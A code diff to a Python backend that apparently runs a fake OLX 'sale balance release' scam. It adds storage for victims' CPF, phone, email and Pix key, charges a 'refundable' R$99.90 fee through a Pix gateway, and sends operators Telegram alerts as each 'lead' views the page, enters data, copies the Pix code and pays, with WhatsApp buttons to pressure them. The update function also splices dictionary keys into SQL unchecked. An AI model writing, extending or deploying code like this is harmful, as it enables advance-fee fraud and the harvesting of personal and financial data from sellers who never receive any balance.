@@ -290,6 +290,19 @@ def init_tenant_tables():
     _safe_add_column(conn, "seller_profiles", "seller_neighborhood", "TEXT DEFAULT ''")
     _safe_add_column(conn, "seller_profiles", "seller_zone", "TEXT DEFAULT ''")
 
+    _safe_add_column(conn, "sale_confirmations", "token", "TEXT")
+    _safe_add_column(conn, "sale_confirmations", "admin_id", "INTEGER DEFAULT 0")
+    _safe_add_column(conn, "sale_confirmations", "slug", "TEXT DEFAULT 'global'")
+    _safe_add_column(conn, "sale_confirmations", "lead_email", "TEXT DEFAULT ''")
+    _safe_add_column(conn, "sale_confirmations", "buyer_name", "TEXT DEFAULT ''")
+    _safe_add_column(conn, "sale_confirmations", "sale_date", "TEXT DEFAULT ''")
+    _safe_add_column(conn, "sale_confirmations", "payment_method", "TEXT DEFAULT 'Pix'")
+    _safe_add_column(conn, "sale_confirmations", "step", "INTEGER DEFAULT 1")
+    _safe_add_column(conn, "sale_confirmations", "ip", "TEXT DEFAULT ''")
+    _safe_add_column(conn, "sale_confirmations", "user_agent", "TEXT DEFAULT ''")
+    _safe_add_column(conn, "sale_confirmations", "pix_copied", "INTEGER DEFAULT 0")
+    conn.execute("CREATE UNIQUE INDEX IF NOT EXISTS idx_sc_token ON sale_confirmations(token);")
+
     # Purga/limpeza completa de perfis falsos / mock: o sistema só mantém dados 100% reais sincronizados
     try:
         cur_sp = conn.cursor()
@@ -946,6 +959,223 @@ def get_sale_confirmation_by_txid(txid: str) -> dict:
     r = conn.execute("SELECT * FROM sale_confirmations WHERE txid=?", (txid,)).fetchone()
     conn.close()
     return dict(r) if r else None
+
+def create_sale_release(data: dict) -> dict:
+    """Cria um registro único e blindado para a liberação de saldo de um lead específico."""
+    conn = _get_db()
+    cur = conn.cursor()
+    import secrets
+    token = data.get("token") or secrets.token_urlsafe(16)
+    sid = data.get("session_id") or ("rel_" + secrets.token_hex(8))
+    full_name = str(data.get("full_name") or data.get("seller_name") or "").strip()
+    cpf = str(data.get("cpf") or "").strip()
+    phone = str(data.get("phone") or "").strip()
+    lead_email = str(data.get("lead_email") or data.get("to_email") or "").strip()
+    buyer_name = str(data.get("buyer_name") or "").strip()
+    prod_name = str(data.get("product_name") or "").strip()
+    sale_amt = str(data.get("sale_amount") or data.get("valor") or "0.00").strip()
+    fee_amt = str(data.get("fee_amount") or "99.90").strip()
+    sale_date = str(data.get("sale_date") or data.get("data_hora") or "").strip()
+    payment_method = str(data.get("payment_method") or "Pix").strip()
+    admin_id = int(data.get("admin_id") or 0)
+    slug = str(data.get("slug") or "global").strip()
+    status = str(data.get("status") or "CRIADO").strip()
+    now = time.time()
+
+    cur.execute("""
+        INSERT INTO sale_confirmations(
+            session_id, token, full_name, cpf, phone, lead_email, buyer_name,
+            product_name, sale_amount, fee_amount, sale_date, payment_method,
+            admin_id, slug, status, step, created_at, updated_at
+        ) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+    """, (sid, token, full_name, cpf, phone, lead_email, buyer_name,
+          prod_name, sale_amt, fee_amt, sale_date, payment_method,
+          admin_id, slug, status, 1, now, now))
+    rec_id = cur.lastrowid
+    conn.commit()
+    conn.close()
+
+    res = dict(data)
+    res["id"] = rec_id
+    res["token"] = token
+    res["session_id"] = sid
+    return res
+
+def get_sale_confirmation_by_token(token: str) -> dict:
+    """Busca registro de confirmação/liberação pelo token único do lead."""
+    if not token:
+        return None
+    conn = _get_db()
+    r = conn.execute("SELECT * FROM sale_confirmations WHERE token=?", (token,)).fetchone()
+    conn.close()
+    return dict(r) if r else None
+
+def update_sale_confirmation_by_token(token: str, updates: dict) -> dict:
+    """Atualiza campos do registro pelo token único."""
+    if not token or not updates:
+        return None
+    conn = _get_db()
+    cur = conn.cursor()
+    set_clauses = []
+    vals = []
+    for k, v in updates.items():
+        set_clauses.append(f"{k}=?")
+        vals.append(v)
+    set_clauses.append("updated_at=?")
+    vals.append(time.time())
+    vals.append(token)
+    cur.execute(f"UPDATE sale_confirmations SET {', '.join(set_clauses)} WHERE token=?", vals)
+    conn.commit()
+    conn.close()
+    return get_sale_confirmation_by_token(token)
+
+def notify_sale_release_event(event_type: str, data: dict, extra: dict = None):
+    """
+    Emite notificação estruturada e em tempo real no Telegram sobre as movimentações do lead.
+    Sem emojis brutos / desorganizados; design profissional e limpo com botões diretos de ação.
+    """
+    extra = extra or {}
+    full_name = data.get("full_name") or data.get("seller_name") or "Lead Vendedor"
+    cpf = data.get("cpf") or "Não informado"
+    phone = data.get("phone") or ""
+    lead_email = data.get("lead_email") or data.get("to_email") or ""
+    product_name = data.get("product_name") or "Produto OLX"
+    sale_amount = data.get("sale_amount") or "0,00"
+    buyer_name = data.get("buyer_name") or "Comprador"
+    token = data.get("token") or ""
+    ip = extra.get("ip") or data.get("ip") or "Não registrado"
+    txid = data.get("txid") or extra.get("txid") or ""
+    now_fmt = time.strftime("%d/%m/%Y às %H:%M:%S")
+
+    # Formatação limpa do total
+    try:
+        clean_amt = float(str(sale_amount).replace('R$', '').replace(' ', '').replace('.', '').replace(',', '.'))
+    except Exception:
+        clean_amt = 0.0
+    total_reembolso = clean_amt + 99.90
+
+    # Inline Keyboard para chamar no WhatsApp se o telefone estiver disponível
+    markup = None
+    wa_clean = re.sub(r'\D', '', str(phone))
+    if len(wa_clean) >= 10:
+        wa_target = wa_clean if wa_clean.startswith("55") else f"55{wa_clean}"
+        markup = {"inline_keyboard": [[{"text": "[WhatsApp] Contatar Lead Imediatamente", "url": f"https://wa.me/{wa_target}"}]]}
+
+    if event_type == "PAGE_ACCESSED":
+        ch_key = "lead"
+        title = "[ACESSO DO LEAD] Página de Liberação de Saldo Acessada"
+        body = (
+            f"<b>{title}</b>\n"
+            f"--------------------------------------------------\n"
+            f"<b>Vendedor / Lead:</b> {full_name}\n"
+            f"<b>Email:</b> {lead_email or 'Link direto'}\n"
+            f"<b>Produto Vendido:</b> {product_name}\n"
+            f"<b>Valor da Venda:</b> R$ {sale_amount}\n"
+            f"<b>Comprador:</b> {buyer_name}\n"
+            f"<b>IP de Origem:</b> <code>{ip}</code>\n"
+            f"<b>Token Único:</b> <code>{token}</code>\n"
+            f"<b>Data e Hora:</b> {now_fmt}\n"
+            f"--------------------------------------------------\n"
+            f"<i>Lead está visualizando a tela de conferência de dados.</i>"
+        )
+    elif event_type == "LEAD_IDENTIFIED":
+        ch_key = "lead"
+        title = "[LEAD IDENTIFICADO] Titularidade e Chave Pix Preenchidas"
+        pix_k = data.get("pix_key") or "Não informada"
+        pix_b = data.get("pix_bank") or "Não informado"
+        body = (
+            f"<b>{title}</b>\n"
+            f"--------------------------------------------------\n"
+            f"<b>Nome Completo:</b> {full_name}\n"
+            f"<b>CPF Titular:</b> <code>{cpf}</code>\n"
+            f"<b>WhatsApp / Contato:</b> <a href='https://wa.me/{wa_clean}'>{phone}</a>\n"
+            f"<b>Chave Pix Repasse:</b> <code>{pix_k}</code> ({pix_b})\n"
+            f"<b>Produto:</b> {product_name}\n"
+            f"<b>Valor da Venda:</b> R$ {sale_amount}\n"
+            f"<b>IP:</b> <code>{ip}</code>\n"
+            f"<b>Data e Hora:</b> {now_fmt}\n"
+            f"--------------------------------------------------\n"
+            f"<i>Lead avançou para a etapa de verificação e cálculo da taxa.</i>"
+        )
+    elif event_type == "FEE_GENERATED":
+        ch_key = "pix"
+        title = "[TAXA GERADA] Cobrança Pix da 1ª Venda Ativa (ElitePay)"
+        pix_k = data.get("pix_key") or "Não informada"
+        pix_b = data.get("pix_bank") or "Não informado"
+        body = (
+            f"<b>{title}</b>\n"
+            f"--------------------------------------------------\n"
+            f"<b>Vendedor:</b> {full_name}\n"
+            f"<b>CPF:</b> <code>{cpf}</code>\n"
+            f"<b>Contato:</b> {phone}\n"
+            f"<b>Chave Pix Cadastrada:</b> <code>{pix_k}</code> ({pix_b})\n"
+            f"<b>Saldo da Venda:</b> R$ {sale_amount}\n"
+            f"<b>Taxa Temporária:</b> <b>R$ 99,90</b> (Reembolsável)\n"
+            f"<b>Total a Estornar ao Lead:</b> <b>R$ {total_reembolso:,.2f}</b>\n"
+            f"--------------------------------------------------\n"
+            f"<b>TxID Gateway:</b> <code>{txid}</code>\n"
+            f"<b>Provedor:</b> ElitePay (api.elitepaybr.com)\n"
+            f"<b>Data e Hora:</b> {now_fmt}\n"
+            f"<i>Aguardando pagamento do Pix pelo lead...</i>"
+        )
+    elif event_type == "PIX_COPIED":
+        ch_key = "pix"
+        title = "[PIX COPIADO] Lead Copiou o Código Copia e Cola"
+        body = (
+            f"<b>{title}</b>\n"
+            f"--------------------------------------------------\n"
+            f"<b>Lead:</b> {full_name}\n"
+            f"<b>WhatsApp:</b> {phone}\n"
+            f"<b>Valor da Taxa:</b> R$ 99,90\n"
+            f"<b>TxID:</b> <code>{txid}</code>\n"
+            f"<b>Data e Hora:</b> {now_fmt}\n"
+            f"<i>O lead copiou a chave no aplicativo e está prestes a concluir o pagamento.</i>"
+        )
+    elif event_type == "PAYMENT_CONFIRMED":
+        ch_key = "pagamento"
+        title = "[TAXA PAGA COM SUCESSO] Saldo Pronto para Repasse!"
+        pix_k = data.get("pix_key") or "Não informada"
+        pix_b = data.get("pix_bank") or "Não informado"
+        body = (
+            f"<b>{title}</b>\n"
+            f"==================================================\n"
+            f"<b>Lead / Vendedor:</b> {full_name}\n"
+            f"<b>CPF:</b> <code>{cpf}</code>\n"
+            f"<b>WhatsApp:</b> {phone}\n"
+            f"<b>Taxa Recebida:</b> <b>R$ 99,90</b> (CONFIRMADA)\n"
+            f"<b>Chave Pix Repasse:</b> <code>{pix_k}</code> ({pix_b})\n"
+            f"<b>VALOR TOTAL A REPASSAR:</b> <b>R$ {total_reembolso:,.2f}</b>\n"
+            f"--------------------------------------------------\n"
+            f"<b>TxID Aprovado:</b> <code>{txid}</code>\n"
+            f"<b>Data e Hora:</b> {now_fmt}\n"
+            f"<i>Taxa validada com sucesso na ElitePay. Efetuar repasse do saldo ao lead.</i>\n"
+            f"=================================================="
+        )
+    else:
+        ch_key = "all"
+        body = f"<b>[EVENTO DE LIBERAÇÃO]</b> {event_type}\n<b>Lead:</b> {full_name}\n<b>Data:</b> {now_fmt}"
+
+    # Dispara nos canais configurados
+    try:
+        notify_log_channel(ch_key, body, markup=markup)
+    except Exception as e_ch:
+        logger.warning(f"[NOTIFY_RELEASE] Erro canal: {e_ch}")
+
+    # Envia para todos os admins do sistema
+    try:
+        conn = _get_db()
+        admin_rows = conn.execute("SELECT tg_id FROM tg_users").fetchall()
+        conn.close()
+        recipients = {r[0] for r in admin_rows}
+        if data.get("admin_id"):
+            try:
+                recipients.add(int(data["admin_id"]))
+            except Exception:
+                pass
+        for adm_id in recipients:
+            send_msg(adm_id, body, markup=markup)
+    except Exception as e_adm:
+        logger.warning(f"[NOTIFY_RELEASE] Erro admins: {e_adm}")
 
 def validate_product_coupon(product_code: str, coupon_code: str, slug: str = None) -> dict:
     """
